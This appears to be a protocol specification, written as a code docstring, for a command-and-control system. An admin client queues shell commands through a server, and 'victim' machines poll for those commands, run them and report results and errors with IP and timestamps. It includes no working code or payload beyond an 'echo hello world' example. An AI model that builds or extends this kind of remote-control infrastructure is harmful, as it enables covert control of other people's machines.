'''
DEFINITION OF THE PROTOCOL

IT CONSIST IN 3 SECTIONS:

    * HEADER
    * CONTENT
    * IDN (IDENTIFICATION TOKEN)

ERROR STRUCTURE PACKAGE:

    [HEADER] -> 0X01
    [CONTENT] -> (SPECIFICATION OF THE ERROR)
    [FLAG] -> (FLAG OF THE ERROR FOR BEAST IDENTIFICATION EXAMPLE: 0X06 IF A COMMAND CANNOT BE EXECUTED AT THE CLIENT`S SIDE)
    -- SOME FLAGS ITS SPECIFIED ONLY IN ERRORS
    
    -- ONLY ERRORS FLAGS:
    
    * CODE ERROR (PROGRAM ERROR) [HEADER -> 0X0FF] ITS ONLY A FLAG SPECIFIED IN ERRORS
    * TIME OUT CONNECTION [HEADER] -> 0X12 ONLY A FLAG
    * UNLOGGED ERROR [HEADER] -> 0X13 ONLY A FLAG
    
    IF SOME ERROR ARE SENDED TO THE SERVER
    THE SERVER CLOSES THE CONNECTION TO THE CLIENT
[VERBS]

NEW CONNECTION [HEADER -> 0X04]
    [SERVER SIDE]
        NOTIFICATION OF NEW CONNECTION
    [CLIENT]
        NEW CONNECTION THE FIRST STEP OF A CONNECTION 
        
    CONTENT: NULL
    

SUCRESS REQUEST [HEADER -> 0X00]
    WHEN A REQUEST ARE SUCRESSFULL IN THE CONTENT SPECIFIES THE RESULT DATA
    [CONTENT] -> (RESULT OF THE ACTION)
    [FLAG] -> (USED FOR IDENTIFICATE THE ACTION MAKED FOR EXAMPLE: LOGIN OR EXECUTE SOME COMMAND)
    
    CAN USE THE FLAG 0x00 FOR TESTING ONLY

ERROR [HEADER -> 0X01]
    WHEN AN EXECUTION OF A COMMAND OR SOME THING FAILS 
    CONTENT: SPECTS OF ERROR
    
END OF SESSION [HEADER -> 0X02]
    CONTENT: NULL DATA
EXECUTE COMMAND [HEADER -> 0X06]
    CONTENT: A COMMAND TO EXECUTE IN THE MACHINE VICTIM 
    -- THE CLIENTS NEEDS TO PROVIDE SOME MECHANISM FOR KNOW WHAT A COMMAND BE EXECUTED
    -- SO INSIDE THE COMMAND PACKAGE WILL HAVE A CHECKSUM CAMP
    GUID: NUMBER 
    -- IF THE GUID ISNOOT THE SANCE COMPARED WITH THE OLD PACKAGE GUID
    -- THE COMMAND WILL BE EXECUTED
         
WRITE FILE INTO THE SERVER [HEADER -> 0X11] {IDN -> KEY}
    CONTENT: [FILE_PATH,CONTENT]
        FILE_PATH: A STRING
        CONTENT: A DICT WHAT INCLUDE INSRTCUTION FOR THE CLIENT 
        EXAMPLE:
            {'HEADER':'0x06','CONTENT':'ECHO HELLO WORLD!'}
GET CONTENT (VICTIM) [HEADER -> 0X07] 
    CONTENT: SOCKET.STREAM FOR TRANSFER THE CONTENT
SEND CONTENT (VICTIM) [HEADER -> 0X08]


WAITING (VICTIM) [HEADER -> 0X09]
    CONTENT: NULL
    INDICATE TO THE SERVER WHAT THE CLIENT ARE READY TO EXECUTE SOME ACTION
ON CONNECTION MADE ACTIONS


LOGIN (CLIENT ADMIN) [HEADER -> 0X10]
    {IDN} -> IDN KEY

WRITE IN SERVER (CLIENT ADMIN) [HEADER -> 0X11]
    {CONTENT} -> DATA DICT

REQUEST EXECUTION ERRORS (CLIENT ADMIN) [HEADER -> 0X15]
    THIS WILL REQUEST THE ERROR SENDED BY THE CLIENT 
    IF THE EXECUTION OF COMMAND FAILS 
    THE SERVER SIDE RETURN A PACKAGE WITH 0X01 IF STDERR VAREABLE HAVE CONTENT
    IN OTHER CASE THE SERVER RETURNS A 0X01 PACKAGE BUT WITH VOID CONTENT
    
    THE STDERR VAREABLE ADS TO THE DICT 3 NEW REGISTERS
    TIME AND IP AND GUID 
    THE GUID KEY FOUNDS FOR IDENTIFICATE THE EXECUTION OF THE COMMAND 
    
REQUEST OF SUCRESS (CLIENT ADMIN) [HEADER -> 0X16]
    IF WAS SUCCRESSFUL THEN RETURN A SUCRESS CONTENT AND FLAG 0X06
    IN OTHER CASE RETURN A VOID CONCENT
RESTART SERVER (CLIENT ADMIN) [HEADER -> 0x17]
    RESTART THE SERVER
        EXAMPLE OF USE:
            [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH 0X17 ?)
            ! > SERVER SIDE CHECHS IF THE USER IP ITS LOGGED
            IF ! USER IP ITS UN LOGGED
            [SERVER] -> [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X01 FLAG 0X13 unlogged)
            [SERVER SIDE CLOSES THE CONNECTION]
            
            ELSE (USER IP LOGGED)
            [SERVER] -> [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X00 FLAG 0X17 )
            -- GOOD BYE
            ~ END OF SESSION CLIENT ADMIN ~
            ! SERVER SIDE RESTART THE SERVER
            


-- START OF SESSION:
[CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X04)
[CLIENT CLOSES THE CONNECTION]
[CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X09)
[Client CLOSES THE CONNECTION]
-- SESSION EXAMPLE:
(PACKAGE WITH 0X06 ) <- [SERVER]
    IF [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X00 (SUCRESS ?))
        [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X00) <- [SERVER] -- NOTIFIED THE SUCRESS EXECUTION OF THE COMMAND [*EXTRA INFO IN CLIENT ADMIN]
        [CLIENT] -> (PACKAGE WITH HEADER 0X09) (WAIT FOR NEW ORDER)
    IF [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X01 (ERROR ?)) 
    
        [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X01) <- [SERVER] -- NOTIFIED THE ERROR OF  EXECUTION OF THE COMMAND
        -- THE ERROR MESSAGE WILL HAVE EXTRA LABELS LIKE TIME AND IP 
        -- TIME THE TIME WHEN THE PACKAGE COME TO THE SERVER
        -- IP THE IP DIRECTION OF THE CLIENT 
        [CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X09) (WAIT FOR NEW ORDER)
    ...
-- END OF SESSION EXAMPLE:
[CLIENT] -> [SERVER] - (PACKAGE WITH HEADER 0X02)
[CLIENT] - (PACKAGE WITH HEADER 0X02) <- [SERVER]


-- CLIENT ADMIN EXAMPLE

[CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X04)
[CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X10) -- LOGIN
    IF [SERVER] - (PACKAGE WITH HEADER 0X01 (ERROR ?)) -> [CLIENT ADMIN ]-- IF THE IDN ITS INCORRECT 
        ** structure of the ERROR PACKAGE IN LOGIN ***
            [HEADER] -> 0X01
            [CONTENT] -> (CONTENT OF THE ERROR)
            [FLAG] -> 0X10
        ! > SERVER SIDE ADD THE TRANSPORT TO A POOL OF ADMIN COMMUNICATIONS 
        ! > SERVER SIDE COUNTER OF TRYS WHAT THE USER CAN MAKE FOR LOGIN DECREMENTS
        
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X10) -- NEW TRY OF LOGIN
        
            IF ! > SERVER SIDE COUNTER IS ZERO
                ! > SERVER SIDE ADD THE CONNECTION TO BADGYS LIST
                -- AND BLOCK'S ALL THE CONNECTIONS 
                ! > SERVER SIDE CLOSE THE CONNECTION
            ! > SERVER SIDE COUNTER DECREMENTS
    IF [SERVER] - (PACKAGE WITH HEADER 0X00 (SUCRESS ?)) -> [CLIENT ADMIN] -- IF THE IDN ITS CORRECT
        -- START SESSION OF ADMIN
        -- EXAMPLE OF ADMIN SESSION
        ! > STARTS TO DECREMENT A COUNTER TIME TO RE LOGIN IN SERVER IF IT IS ZERO CLOSE THE CONNECTION
        
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER  0X11) -- WRITES A COMMAND IN THE COMMANDS FILE SO THE CLIENT WILL RECIVE IT
        -- if we specified the flag 0x22 then the vareable file
        -- will bre reasigned to the value of data['CONTENT']
        -- in other case the file['CONTENT'] de filled with the data content order
        -- the flag 0x22 use if you want to send other commands 
        -- if you whant to send new commands to execute use 0x22 flag
        
            -- the package doesnot have a IDN because we will know what the user its autenticate for the same ip address used
        [CLIENT ADMIN] -> [SERVER] (PACKAGE WITH HEADER 0X15)
        [SERVER CLOSES THE CONNECTION]
        -- REQUEST OF ERRORS 
        [CLIENT ADMIN] -> [SERVER] (PACKAGE WITH HEADER 0X16)
        [SERVER CLOSES THE CONNECTION]
        -- REQUEST OF SUCRESS
        IF [SERVER] -> [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X01 (ERROR?))
            -- THE USER WAS NOT LOGGED ERROR
            -- SENDS A FLAG 0X13
            -- SERVER CLOSES THE CONNECTION
        IF ! > SERVER STDERR CONTENT: 0X01 
            [SERVER] -> [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X01 FLAG 0X06)
            -- SENDS A ERROR
        IF [SERVER] - (PACKAGE WITH HEADER 0X00 (SUCRESS ?)) -> [CLIENT ADMIN]
            -- IF THE RESOURCE HAS WRITTED ON THE DOCUMENT
        IF [SERVER] - (PACKAGE WITH HEADER 0X01 (ERROR ?)) -> [CLIENT ADMIN]
            -- IF THE RESOURSE HASNOT WRITTED ON THE DOCUMENT NOTIFIED TO THE CLIENT ADMIN
            -- THIS ERROR USES A FLAG 0X11
-- CLOSE THE CONNECTION 
-- VOLUNTUARY (WHEN THE ADMIN CLIENT SENDS A SIGNAL OF EXIT)
[CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X02)
[CLIENT ADMIN] - (PACKAGE WITH HEADER 0X02) <- [SERVER]
-- TIME OUT SESSION (WHEN THE SESSION TIME EXPIRED)
[CLIENT ADMIN] - (PACKAGE WITH HEADER 0X01) <- [SERVER]
-- THE SERVER SENDS A ERROR PACKAGE INSIDE THEM SPECIFICATE THE TIME OUT ERROR
-- THE FLAG INDICATED BE 0x12
'''